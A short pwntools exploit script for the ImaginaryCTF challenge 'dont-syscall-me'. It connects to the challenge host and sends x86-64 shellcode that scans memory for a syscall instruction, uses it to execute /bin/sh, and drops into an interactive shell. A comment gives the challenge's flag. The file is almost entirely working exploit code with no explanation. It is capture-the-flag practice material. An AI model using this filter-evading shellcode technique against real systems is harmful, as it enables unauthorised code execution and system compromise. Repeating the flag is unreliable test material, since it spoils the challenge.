#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('vuln',checksec=False)
p = elf.process()
p = remote('dont-syscall-me.chal.imaginaryctf.org',1337)

shellcode = asm('''
lea r8,[rip]+0x3000 # near ld .text section

search_syscall:
	mov r11,0x4d2
	add r11,0x3d # search syscall gadget opcode
	cmp word ptr[r8],r11w
	je get_shell
	inc r8
	jmp search_syscall

get_shell:
	mov rax,0x3b
	lea rdi,[rip+sh]
	jmp r8 # syscall

sh: 
	.ascii "/bin/sh"
''')

print(len(shellcode))
p.send(shellcode)
p.interactive() # ictf{sc4nn1ng_thrU_m3m0ry}